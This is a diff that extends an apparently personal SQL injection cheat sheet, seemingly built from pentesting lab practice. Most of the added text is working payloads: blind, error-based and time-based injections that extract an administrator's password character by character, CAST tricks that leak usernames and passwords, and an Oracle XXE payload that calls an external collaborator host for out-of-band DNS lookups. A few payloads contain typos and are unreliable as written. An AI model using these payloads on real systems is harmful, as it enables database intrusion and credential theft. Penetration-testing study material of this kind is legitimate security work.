@@ -62,7 +62,15 @@ Check individual Character:
 SELECT substring(database(),1,1)
 ```
 
-This substring you can fuzz for single character in a specific query
+Check password length:
+```SQL
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+```
+
+This sub-string you can fuzz for single character in a specific query
+```SQL
+' AND substring((SELECT password FROM users WHERE username='administrator'),1,1)='a
+```
 
 ```SQL
 AND substring((SELECT password FROM users WHERE username='admin'),1,1='p')
@@ -77,8 +85,88 @@ Sleep timers:
 ' || pg_sleep(10) --postgres
 
 ' AND SLEEP(10)
+
+'; IF (1=1) WAITFOR DELAY '0:0:10'--        --MS SQL
 ```
 
+##### Error based Blind
+
+Test for Error base:
+```SQL 
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+
+```
+
+If seeing a 500 server error try:
+```SQL
+'||(SELECT '' FROM dual)||'
+```
+
+##### Testing Oracle:
+```SQL
+' AND (SELECT CASE WHEN 1=1 THEN 1/0 ELSE NULL END FROM dual) IS NULL
+```
+
+To test one character at a time
+```SQL
+' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+
+Alternate testing for Oracle if see a 500 error:
+
+```SQL
+'|| (SELECT '' FROM dual)||'
+-- This should return no error confirming oracle. Oracle requries real table to be present
+
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+-- if no error, then users table exists
+
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)'
+-- test error base blind. 
+
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+-- IF the statement is true you will see an error returned confirming there is a user named adminsitrator.
+
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+--Play around until you get the length of the password.
+
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+--in intruder mess with the password value to find it.
+```
+
+#### Blind to visible error based.
+
+Changing the data type using cast() can produce visible error message:
+```SQL
+' AND CAST((SELECT 1) AS int)-- 
+```
+After seeing error stating that AND condition must be a boolean try:
+```SQL
+' AND 1=CAST((SELECT 1) AS int)-- 
+```
+If you don't see and error, this query is valid and can proceed.
+```SQL
+' AND 1=CAST((SELECT username FROM users) AS int)--
+```
+If you see error cutting off the string, you hit character limit. Delete the parts left of the ' escape to free up space. If you see error of more than one row being returned, limit the return
+```SQL
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+This should leak the first username, from here change to getting the password.
+```SQL
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+
+##### Time based error 
+```SQL
+'; IF (SELECT COUNT(username) FROM USERS WHREE username = 'administrator') AND SUBSTRING(password,1,1) > 'm' = 1 WAITFOR DELAY '0:0:10'-- 
+```
+
+Postgres:
+```SQL
+'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTRING(password,1,20)%3d'a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users-- 
+```
 ### Fingerprinting
 Used to fingerprint the database.
 
@@ -165,4 +253,14 @@ Extracts data (example from table dev in database credentials):
 ```SQL
 cn' UNION select 1, username, password, 4 from dev.credentials--
 ```
+
+
+
+## DNS Lookup
+
+ORACLE- (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+```SQL
+x`+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"https%3a//######.oastify.com">+%25remote%3b/]>'),'/l')+FROM+dual--+
+```
+
 
